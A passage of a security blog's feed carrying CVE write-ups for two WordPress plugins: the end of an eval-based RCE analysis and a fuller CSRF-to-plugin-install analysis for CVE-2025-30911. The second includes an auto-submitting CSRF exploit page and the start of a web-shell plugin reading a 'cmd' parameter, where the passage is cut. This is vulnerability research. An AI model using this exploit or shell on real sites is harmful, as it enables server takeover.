4;:\&amp;#34;0\&amp;#34;},\&amp;#34;dateUpdated\&amp;#34;:123} --&amp;gt;\n&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#39; alt=&#34;Result&#34; height=&#34;868&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;Widget Options &amp;lt;= 4.0.7&lt;/strong&gt; stems from the &lt;strong&gt;unsafe use of &lt;code&gt;eval()&lt;/code&gt;&lt;/strong&gt; in the &lt;strong&gt;display logic&lt;/strong&gt; feature. User-controlled data from the block attribute &lt;code&gt;extended_widget_opts&lt;/code&gt; is passed directly into the &lt;code&gt;widgetopts_safe_eval()&lt;/code&gt; function without &lt;strong&gt;proper validation, filtering, or sanitization&lt;/strong&gt;. This allows an &lt;strong&gt;authenticated&lt;/strong&gt; attacker with &lt;strong&gt;Contributor (or higher)&lt;/strong&gt; privileges to inject and execute arbitrary PHP code during block rendering, leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; on the server.&lt;/p&gt;&#xA;&lt;p&gt;Although later versions introduced expression validation, the root cause still lies in &lt;strong&gt;trusting unfiltered logic input&lt;/strong&gt; and allowing dynamic execution through &lt;code&gt;eval()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Never pass user-controlled data into &lt;code&gt;eval()&lt;/code&gt;&lt;/strong&gt;, even in “logic” or conditional features.&lt;/li&gt;&#xA;&lt;li&gt;All block / widget attributes must be &lt;strong&gt;strictly validated and sanitized&lt;/strong&gt; before use.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Contributor-level privileges can still be extremely dangerous&lt;/strong&gt; when combined with unsafe server-side code execution mechanisms.&lt;/li&gt;&#xA;&lt;li&gt;Avoid dynamic code execution; instead, use a &lt;strong&gt;safe parser&lt;/strong&gt; or a &lt;strong&gt;whitelist of valid expressions&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-options/vulnerability/wordpress-widget-options-plugin-4-0-7-authenticated-contributor-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin &amp;lt;= 4.0.7 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30911 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-03-cve-2025-30911/</link>
      <pubDate>Wed, 03 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-03-cve-2025-30911/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; vulnerability in &lt;strong&gt;Rometheme RomethemeKit For Elementor&lt;/strong&gt; allows &lt;strong&gt;Command Injection&lt;/strong&gt; to occur. This issue affects &lt;strong&gt;RomethemeKit For Elementor&lt;/strong&gt; from n/a up to version &lt;strong&gt;1.5.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30911&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30911&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.5.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;RTMKit&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;Although the vulnerability was reported as affecting up to version &lt;strong&gt;1.5.4&lt;/strong&gt;, it was actually partially patched in that version, so I chose version &lt;strong&gt;1.5.3&lt;/strong&gt; for the analysis.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function install_requirements()&#xA;{&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/plugin.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/misc.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/class-wp-upgrader.php&amp;#39;;&#xA;&#xA;    $plugin = $_POST[&amp;#39;plugin&amp;#39;];&#xA;    $plugin_file = WP_PLUGIN_DIR . &amp;#39;/&amp;#39; . $plugin;&#xA;    $plugin_slug = dirname($plugin);&#xA;&#xA;    if (file_exists($plugin_file)) {&#xA;        // Activate the plugin if already installed but inactive&#xA;        ob_start();&#xA;        activate_plugin($plugin);&#xA;        ob_clean();&#xA;        ob_end_clean();&#xA;        wp_send_json_success(&amp;#34;Install and Activate Successfully&amp;#34;);&#xA;    } else {&#xA;        ob_start();&#xA;        $plugin_download_url = &amp;#34;https://downloads.wordpress.org/plugin/{$plugin_slug}.latest-stable.zip&amp;#34;; // Adjust URL structure&#xA;        $upgrader = new \Plugin_Upgrader();&#xA;        $result = $upgrader-&amp;gt;install($plugin_download_url);&#xA;&#xA;        if (is_wp_error($result)) {&#xA;            wp_send_json_error();&#xA;        }&#xA;        $activate_result = activate_plugin($plugin);&#xA;        if (is_wp_error($activate_result)) {&#xA;            wp_send_json_error(&amp;#39;Plugin installed but failed to activate: &amp;#39; . $activate_result-&amp;gt;get_error_message());&#xA;        }&#xA;&#xA;        wp_send_json_success(&amp;#39;Plugin installed and activated successfully.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;install_requirements()&lt;/code&gt; function allows downloading and activating a plugin based on the value of &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If the plugin is already downloaded but not activated, it will be activated:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (file_exists($plugin_file)) {&#xA;    // Activate the plugin if already installed but inactive&#xA;    ob_start();&#xA;    activate_plugin($plugin);&#xA;    ob_clean();&#xA;    ob_end_clean();&#xA;    wp_send_json_success(&amp;#34;Install and Activate Successfully&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If the plugin is not yet downloaded, it will be downloaded.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;However, this function does not perform any user privilege validation.&lt;/p&gt;&#xA;&lt;p&gt;In version &lt;code&gt;v1.5.4&lt;/code&gt;, the developer partially fixed the issue by adding:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; is a capability reserved for &lt;strong&gt;Administrators&lt;/strong&gt;, so only Admin accounts can now call this function. This prevents normal users (&lt;strong&gt;Subscriber&lt;/strong&gt;, &lt;strong&gt;Author&lt;/strong&gt;, etc.) and unauthenticated users from directly exploiting the vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;However, this patch is still not sufficient. Why?&lt;/p&gt;&#xA;&lt;p&gt;Although the function is restricted to &lt;strong&gt;Administrators&lt;/strong&gt;, there is no &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt; protection. This means that:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;If an &lt;strong&gt;Administrator&lt;/strong&gt; is logged into the WordPress website and visits a malicious website controlled by an attacker, that website can silently send a (POST) request to &lt;code&gt;install_requirements&lt;/code&gt;. The request will be executed with &lt;strong&gt;Administrator&lt;/strong&gt; privileges because the browser automatically includes the authenticated cookies.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;In version &lt;strong&gt;v1.5.5&lt;/strong&gt;, the vulnerability was finally and properly patched by adding a nonce verification:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  !wp_verify_nonce($_POST[&amp;#39;wpnonce&amp;#39;], &amp;#39;rtm_template_nonce&amp;#39;)) {&#xA;    wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By combining both protection layers:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; → privilege check&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_verify_nonce()&lt;/code&gt; → CSRF protection&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;the vulnerability was correctly mitigated.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX action for authenticated users (&lt;code&gt;wp_ajax_&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_install_requirements&amp;#39;, [$this, &amp;#39;install_requirements&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=install_requirements&lt;/code&gt;, the &lt;code&gt;install_requirements&lt;/code&gt; callback is executed.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Administrator is logged in to the WordPress site&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Administrator visits a malicious website controlled by the attacker&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Browser automatically includes Administrator cookies&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;WordPress treats the request as coming from an authenticated Admin&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;install_requirements() is executed without nonce validation&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Untrusted $_POST[&amp;#39;plugin&amp;#39;] is processed&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Plugin_Upgrader-&amp;gt;install()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;activate_plugin()&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Malicious plugin is installed and activated&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a website containing the payload and send it to the Administrator:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&#xA;  &amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;action&amp;#34; value=&amp;#34;install&amp;amp;#95;requirements&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;plugin&amp;#34; value=&amp;#34;malicious&amp;amp;#95;plugin&amp;amp;#47;malicious&amp;amp;#95;plugin&amp;amp;#95;dir&amp;amp;#46;php&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit request&amp;#34; /&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;      history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;);&#xA;      document.forms[0].submit();&#xA;    &amp;lt;/script&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;When the Administrator visits the page, the plugin will be activated.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Example plugin:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!defined(&amp;#39;ABSPATH&amp;#39;)) {&#xA;    exit;&#xA;}&#xA;&#xA;add_action(&amp;#39;init&amp;#39;, function () {&#xA;    if (isset($_REQUEST[&amp;#39;cmd&amp;#39;])) {&#xA;        